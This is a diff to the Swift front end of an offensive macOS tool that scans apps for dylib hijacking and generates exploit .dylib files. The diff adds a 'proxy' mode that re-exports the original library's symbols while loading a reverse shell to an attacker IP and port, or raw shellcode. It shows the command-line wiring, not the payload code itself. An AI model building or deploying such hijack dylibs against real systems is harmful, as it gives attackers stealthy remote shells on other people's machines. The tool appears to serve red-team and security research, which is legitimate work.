@@ -30,11 +30,14 @@ let helpMessage = """
   --help, -h              Show this help information.
 
 \u{001B}[1mGENERATE OPTIONS:\u{001B}[0m
-  --type <type>           'revshell' or 'raw'
+  --type <type>           'revshell', 'raw', or 'proxy'
   --output <path>         Output .dylib path (default: exploit.dylib)
-  --host <ip>             (revshell) Attacker IP
-  --port <port>           (revshell) Attacker Port
-  --payload <file>        (raw) Path to raw shellcode file (.bin)
+  --host <ip>             (revshell/proxy) Attacker IP
+  --port <port>           (revshell/proxy) Attacker Port
+  --payload <file>        (raw/proxy) Path to raw shellcode file (.bin)
+  --from <dylib>          (proxy) Original dylib to re-export (version + symbols)
+  --reexport-path <path>  (proxy) Path where the real lib is staged on target
+                          (default: absolute path of the generated .real.dylib)
 
 \u{001B}[1mDESCRIPTION:\u{001B}[0m
   Scans macOS applications for Dylib Hijacking vulnerabilities, including:
@@ -62,7 +65,9 @@ if args.count > 1 && args[1] == "generate" {
     var host: String?
     var port: Int?
     var payload: String?
-    
+    var from: String?
+    var reexportPath: String?
+
     var i = 2
     while i < args.count {
         let arg = args[i]
@@ -81,6 +86,12 @@ if args.count > 1 && args[1] == "generate" {
         } else if arg == "--payload" && i+1 < args.count {
             payload = args[i+1]
             i += 1
+        } else if arg == "--from" && i+1 < args.count {
+            from = args[i+1]
+            i += 1
+        } else if arg == "--reexport-path" && i+1 < args.count {
+            reexportPath = args[i+1]
+            i += 1
         }
         i += 1
     }
@@ -91,7 +102,18 @@ if args.count > 1 && args[1] == "generate" {
     }
     
     let outputURL = URL(fileURLWithPath: output)
-    
+
+    // Build the payload spec shared by standalone and proxy modes.
+    func resolvePayload() -> ExploitGenerator.PayloadType? {
+        if let h = host, let p = port {
+            return .reverseShell(host: h, port: p)
+        }
+        if let p = payload {
+            return .rawShellcode(url: URL(fileURLWithPath: p))
+        }
+        return nil
+    }
+
     if mode == "revshell" {
         guard let h = host, let p = port else {
             print("\u{001B}[31mError: revshell requires --host and --port\u{001B}[0m")
@@ -106,11 +128,28 @@ if args.count > 1 && args[1] == "generate" {
         }
         print("Generating Raw Shellcode dylib from \(p)...")
         _ = ExploitGenerator.generate(type: .rawShellcode(url: URL(fileURLWithPath: p)), outputURL: outputURL)
+    } else if mode == "proxy" {
+        guard let original = from else {
+            print("\u{001B}[31mError: proxy requires --from <original.dylib>\u{001B}[0m")
+            exit(1)
+        }
+        guard let payloadType = resolvePayload() else {
+            print("\u{001B}[31mError: proxy requires a payload (--host/--port or --payload)\u{001B}[0m")
+            exit(1)
+        }
+        print("Generating proxy (re-export) dylib from \(original)...")
+        let ok = ProxyGenerator.generate(
+            from: URL(fileURLWithPath: original),
+            output: outputURL,
+            payload: payloadType,
+            reexportPathOverride: reexportPath
+        )
+        exit(ok ? 0 : 1)
     } else {
         print("Unknown type: \(mode)")
         exit(1)
     }
-    
+
     exit(0)
 }
 
